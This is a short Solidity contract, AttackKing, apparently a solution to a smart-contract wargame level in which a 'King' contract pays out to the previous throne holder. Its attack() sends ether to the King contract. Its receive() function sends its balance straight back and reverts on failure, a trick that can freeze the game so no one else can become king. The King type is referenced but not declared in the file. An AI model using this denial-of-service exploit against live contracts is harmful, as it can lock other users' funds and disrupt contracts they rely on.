pragma solidity ^0.8.0;

contract AttackKing {
    King public kingInstance;


    constructor(address _instance) {
        kingInstance = King(_instance);
    }

    function attack() external payable {
        (bool success, ) = address(kingInstance).call{value: msg.value}('');
        require(success, "Initial attack failed");
    }

    receive() external payable {
        (bool success, ) = address(kingInstance).call{value: address(this).balance}('');
        require(success, "Re-attack failed");
    }
}